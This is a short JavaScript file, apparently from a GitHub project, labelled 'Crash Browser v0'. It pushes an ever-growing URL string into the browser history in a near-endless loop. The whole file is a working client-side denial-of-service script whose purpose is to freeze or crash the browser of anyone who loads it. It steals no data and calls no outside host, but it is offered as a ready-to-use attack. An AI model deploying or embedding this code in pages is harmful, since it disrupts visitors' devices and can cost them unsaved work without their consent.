/*

NAME: Crash Browser v0

DESCRIPTION: Simple JS script that overloads the browser with a huge URL. (https://github.com/maximousblk/crashbrowser)

AUTHOR: maximousblk 

DATE: 12-04-2023

COMMAND: None

OPTIONS: None

*/

var total = "";
for( var i = 0; i < 10000000000000; i++ ) {
total += i.toString();
history.pushState(0,0, total );
}